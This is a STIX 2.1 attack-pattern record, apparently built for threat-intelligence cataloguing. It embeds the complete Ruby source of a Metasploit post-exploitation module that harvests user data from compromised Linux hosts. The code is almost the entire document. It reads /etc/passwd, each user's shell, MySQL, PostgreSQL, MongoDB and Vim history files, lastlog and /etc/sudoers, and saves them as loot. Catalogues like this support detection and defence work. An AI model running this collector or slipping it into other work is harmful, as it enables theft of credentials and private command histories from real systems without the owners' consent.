{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--96d570a0-20e0-4b4c-9d55-7cd8defaf0e0",
    "created": "2024-08-14T16:33:17.302204Z",
    "modified": "2024-08-14T16:33:17.302207Z",
    "name": "Linux Gather User History",
    "description": " This module gathers the following user-specific information: shell history, MySQL history, PostgreSQL history, MongoDB history Vim history, lastlog, and sudoers.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/gather/enum_users_history.rb",
            "external_id": "enum_users_history.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Linux::System\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linux Gather User History',\n        'Description' => %q{\n          This module gathers the following user-specific information:\n          shell history, MySQL history, PostgreSQL history, MongoDB history,\n          Vim history, lastlog, and sudoers.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          # based largely on get_bash_history function by Stephen Haywood\n          'ohdae <bindshell[at]live.com>'\n        ],\n        'Platform' => ['linux'],\n        'SessionTypes' => ['shell', 'meterpreter']\n      )\n    )\n  end\n\n  def run\n    distro = get_sysinfo\n\n    print_good('Info:')\n    print_good(\"\\t#{distro[:version]}\")\n    print_good(\"\\t#{distro[:kernel]}\")\n\n    user = execute('/usr/bin/whoami')\n    users = execute('/bin/cat /etc/passwd | cut -d : -f 1').chomp.split\n    users = [user] if user != 'root' || users.blank?\n\n    vprint_status(\"Retrieving history for #{users.length} users\")\n    shells = %w[ash bash csh ksh sh tcsh zsh]\n    users.each do |u|\n      home = get_home_dir(u)\n      shells.each do |shell|\n        get_shell_history(u, home, shell)\n      end\n      get_mysql_history(u, home)\n      get_psql_history(u, home)\n      get_mongodb_history(u, home)\n      get_vim_history(u, home)\n    end\n\n    last = execute('/usr/bin/last && /usr/bin/lastlog')\n    sudoers = cat_file('/etc/sudoers')\n    save('Last logs', last) unless last.blank?\n    save('Sudoers', sudoers) unless sudoers.blank? || sudoers =~ /Permission denied/\n  end\n\n  def save(msg, data, ctype = 'text/plain')\n    ltype = 'linux.enum.users'\n    loot = store_loot(ltype, ctype, session, data, nil, msg)\n    print_good(\"#{msg} stored in #{loot}\")\n  end\n\n  def execute(cmd)\n    vprint_status(\"Execute: #{cmd}\")\n    output = cmd_exec(cmd)\n    output\n  end\n\n  def cat_file(filename)\n    vprint_status(\"Download: #{filename}\")\n    output = read_file(filename)\n    output\n  end\n\n  def get_home_dir(user)\n    home = execute(\"echo ~#{user}\")\n    if home.empty?\n      if user == 'root'\n        home = '/root'\n      else\n        home = \"/home/#{user}\"\n      end\n    end\n    home\n  end\n\n  def get_shell_history(user, home, shell)\n    vprint_status(\"Extracting #{shell} history for #{user}\")\n    hist = cat_file(\"#{home}/.#{shell}_history\")\n    save(\"#{shell} history for #{user}\", hist) unless hist.blank? || hist =~ /No such file or directory/\n  end\n\n  def get_mysql_history(user, home)\n    vprint_status(\"Extracting MySQL history for #{user}\")\n    sql_hist = cat_file(\"#{home}/.mysql_history\")\n    save(\"MySQL history for #{user}\", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/\n  end\n\n  def get_psql_history(user, home)\n    vprint_status(\"Extracting PostgreSQL history for #{user}\")\n    sql_hist = cat_file(\"#{home}/.psql_history\")\n    save(\"PostgreSQL history for #{user}\", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/\n  end\n\n  def get_mongodb_history(user, home)\n    vprint_status(\"Extracting MongoDB history for #{user}\")\n    sql_hist = cat_file(\"#{home}/.dbshell\")\n    save(\"MongoDB history for #{user}\", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/\n  end\n\n  def get_vim_history(user, home)\n    vprint_status(\"Extracting Vim history for #{user}\")\n    vim_hist = cat_file(\"#{home}/.viminfo\")\n    save(\"Vim history for #{user}\", vim_hist) unless vim_hist.blank? || vim_hist =~ /No such file or directory/\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux']"
    ]
}